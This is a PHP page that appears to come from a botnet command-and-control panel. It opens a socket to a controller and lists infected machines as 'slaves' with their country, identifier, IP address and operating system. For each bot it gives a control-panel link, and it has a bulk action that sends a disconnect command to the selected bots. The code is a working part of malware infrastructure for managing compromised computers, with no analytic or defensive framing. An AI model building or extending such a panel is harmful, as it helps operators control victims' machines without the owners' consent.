<?php
xdebug_disable();

require_once "request.php";

$request = new Request();
$sock = $request->createSocket();

if (isset($_POST['select']) && isset($_POST['action'])) {
	$action = $_POST['action'];
	
	if ($action == "disconnect") {
		$request->write($sock, 10);
		$request->write($sock, count($_POST['select']));
	}
	foreach ($_POST['select'] as $slave) {
		$request->write($sock, $slave);
	}
} else {

}

$slaves = $request->getSlaves($sock);
$request->disconnect($sock);


require "layout/header.php";

?>

<script>
$(document).ready(function() {
    $('#selectall').click(function(event) {
        if(this.checked) { 
            $('.box').each(function() {
                this.checked = true;          
            });
        }else{
            $('.box').each(function() { 
                this.checked = false;            
            });         
        }
    });
    
});</script>


<section class="wrapper scrollable">
<div class="col-md-12">
<div class="panel panel-default panel-block">
	<div class="list-group">
		<div class="list-group-item">
			<div class="form-group">
				<h4 class="section-title">Bot List</h4>
				<!--Basic Table-->

				<table class="table table-bordered table-striped">
					<thead class="">
						<tr>
							<th>Country</th>
							<th>Identifier</th>
							<th>IP</th>
							<th>Operating System</th>
							<th></th>
							<th><input type="checkbox" class="box" id="selectall"></th>
							<th>
						</tr>
					</thead>
					<tbody>
	
					<?php
					/*
					 * $i = 1;
					 * foreach ($slaves as $slave) {
					 * echo "<tr>" . str_replace("%c", $i++ & 1 ? "tg-vn4c" : "tg-031e", $slave->getTableFormatted($i)) . "</tr>\n";
					 * }
					 */
					function printTableData($s) {
						echo "<td>" . $s . "</td>\n";
					}
					

					$page = isset($_GET['page']) ? $_GET['page'] : "all";
					
					
					$displayed = 0;
					
					if ($page == "all") {
						$start = 0;
						$max = count($slaves);
					} else {
						$page--;
						
						$max = 10;
						$start = $page * $max;
						
						if ($page < 0) {
							$page = 0;
						}
					}
												
					for ($i = $start; $i < $start + $max; $i++) {
						if (!isset($slaves[$i])) {
							break;
						}
						$slave = $slaves[$i];
						
						$displayed++;

						echo "<tr>\n";
						echo printTableData($slave->getDisplayCountry());
						echo printTableData($slave->getIdentifier());
						echo printTableData($slave->getIP());
						echo printTableData($slave->getOperatingSystem());
						echo printTableData("<a href='bots.php?id=" . $slave->getUniqueId() . "'><button type='button' class='btn btn-xs btn-info'>CP</button></a>");
						echo printTableData("<input class='box' type='checkbox' name='select[$i]' value='" . $slave->getUniqueId() . "'>");
						echo "</tr>\n";
					
					}
					?>
	
					</tbody>
				</table>
				<div class="form-group" align="right">
					<div>
						<ul class="pagination pagination-demo">
							<?php 				
							$page++;
							echo '<li><a href="index.php?page=' . ($page - 1) . '">&laquo;</a></li>';
							echo '<li><a href="index.php?page=' . ($page) . '">' . ($page). '</a></li>';
							echo '<li><a href="index.php?page=' . ($page + 1) . '">&raquo;</a></li>';
							?>
							
						</ul>
					</div>
				</div>
			</div>
		</div>
	</div>
</div>
</div>
</section>

<?php 

require "layout/footer.php";

?>